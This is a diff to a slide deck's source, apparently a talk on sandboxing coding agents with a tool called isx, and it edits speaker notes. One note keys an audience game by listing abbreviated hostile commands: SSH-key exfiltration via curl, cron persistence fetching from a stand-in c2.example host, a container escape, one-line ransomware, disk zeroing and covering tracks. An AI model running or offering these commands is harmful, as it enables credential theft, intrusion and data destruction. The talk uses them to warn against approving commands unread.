@@ -27,16 +27,16 @@ layout: center
 
 <h1 class="statement">Hand the agent a task, <span class="accent">walk away</span>, come back to finished work.</h1>
 
-<p class="lead mt-8">Every part of isx answers a problem from your first week with an agent.<br>Let's have that week.</p>
+<p class="lead mt-8">Every part of isx answers a problem you hit in your first days with an agent.<br>Let's start with the first one.</p>
 
 <!--
-Spoken intro: "Here's what we were promised." Read the line. "That's the job description of a coding agent. Not a faster autocomplete: you hand it a task, you leave, you come back to finished work. Hold on to that sentence: it's the bar I'll hold everything to today. Every part of isx exists because something got in the way of it. So let's have the week where that happens."
-It's the promise, not a wish and not isx's claim: the way agents are sold, and the thing you actually want. Monday is what happens when you take it at its word.
+Spoken intro: "Here's what we were promised." Read the line. "That's the job description of a coding agent. Not a faster autocomplete: you hand it a task, you leave, you come back to finished work. Hold on to that sentence: it's the bar I'll hold everything to today. Every part of isx exists because something got in the way of it. So let's see what gets in the way."
+It's the promise, not a wish and not isx's claim: the way agents are sold, and the thing you actually want. The first act is what happens when you take it at its word.
 The shape of the talk: why (the week everyone has with an agent), what (a machine of its own), and how it's built: the part for this audience, Quarkus all the way down.
 -->
 
 <!--
-The yardstick for the whole talk: every act ends by ticking one box. Then: here's how that week actually goes.
+The yardstick for the whole talk. Then: here's how it actually goes.
 -->
 
 ---
@@ -105,7 +105,7 @@ clicks: 2
 <!--
 Scoring: Y/N record what the room shouted; a yes to a command nobody should approve turns the chip red and counts in "waved through, to regret later". It lands the allowlist slide's point one slide early: even a room full of people gets sloppy after twenty prompts. Switch it off with :score="false" on <ApproveLoop> if it changes the mood.
 Explain the game before the first click: I'll show a command, you shout YES or NO. Click 1 (space / →) starts it. Keys Y and N record what the room shouted for the command on screen, and the bird approves it anyway; the tally counts how often the room said no. Y/N work from the presenter window too. The ordinary and the outrageous are mixed on purpose: after a few, nobody reads them any more, which is the point. Whatever the room shouts, the bird approves it. Let it run for a dozen; click 2 freezes the game and shows what Homer came back to: "Situation critical. Explosion imminent." Then: the next slide is the drinking bird, in Claude Code's terms.
-Key to the references, in case one gets a laugh or a question: left-pad (the 2016 npm unpublish that broke builds worldwide) · curl | sudo sh (installer piped into root; .example domains are reserved and point nowhere) · cat id_ed25519 | curl (exfiltrating your SSH key) · echo $AWS_SECRET_ACCESS_KEY (a live secret into the transcript) · npm publish (supply chain, as you) · --author="Linus Torvalds" (forged authorship; Friday's identity slide) · find / -name "*.pem" (harvesting keys) · youtu.be/dQw4w9WgXcQ (the Rickroll) · crontab @reboot curl c2.example | sh (malware persistence via a command-and-control server) · gh pr merge --admin (bypassing required reviews) · alias sudo='sudo rm -rf /' (booby-trapping the next human) · docker --privileged -v /:/host chroot (the textbook container escape: root on the host) · tar | openssl enc -pass pass:hunter2 && rm -rf (ransomware in one line; hunter2 is the old IRC joke password) · history -c (covering tracks) · dd if=/dev/zero of=/dev/nvme0n1 (zeroing the disk) · shutdown -h now (the agent's logic, concluded).
+Key to the references, in case one gets a laugh or a question: left-pad (the 2016 npm unpublish that broke builds worldwide) · curl | sudo sh (installer piped into root; .example domains are reserved and point nowhere) · cat id_ed25519 | curl (exfiltrating your SSH key) · echo $AWS_SECRET_ACCESS_KEY (a live secret into the transcript) · npm publish (supply chain, as you) · --author="Linus Torvalds" (forged authorship: the agent should commit as itself) · find / -name "*.pem" (harvesting keys) · youtu.be/dQw4w9WgXcQ (the Rickroll) · crontab @reboot curl c2.example | sh (malware persistence via a command-and-control server) · gh pr merge --admin (bypassing required reviews) · alias sudo='sudo rm -rf /' (booby-trapping the next human) · docker --privileged -v /:/host chroot (the textbook container escape: root on the host) · tar | openssl enc -pass pass:hunter2 && rm -rf (ransomware in one line; hunter2 is the old IRC joke password) · history -c (covering tracks) · dd if=/dev/zero of=/dev/nvme0n1 (zeroing the disk) · shutdown -h now (the agent's logic, concluded).
 -->
 
 ---
@@ -784,7 +784,7 @@ clicks: 3
 
 <!--
 One click per panel: the same machine and the same three requests each time. api.anthropic.com and github.com go through the proxy because isx intercepts them (github.com when the template has gh); evil.example stands for any other host.
-Airgapped runs no agent: the agent needs its model's API, and there's no network at all. It's for running code you don't trust, like Friday's reproducer: let the agent prepare a machine with network, then branch it with --airgap (isx branch run-1 --from repro-1 --airgap) and run only the tests. Dependencies have to be there already, from the template's prime step or the agent's earlier build. (An agent with a local model inside the machine could work offline, but isx doesn't set that up.)
+Airgapped runs no agent: the agent needs its model's API, and there's no network at all. It's for running code you don't trust, like an outside pull request or a bug reproducer: let the agent prepare a machine with network, then branch it with --airgap (isx branch run-1 --from repro-1 --airgap) and run only the tests. Dependencies have to be there already, from the template's prime step or the agent's earlier build. (An agent with a local model inside the machine could work offline, but isx doesn't set that up.)
 -->
 
 ---
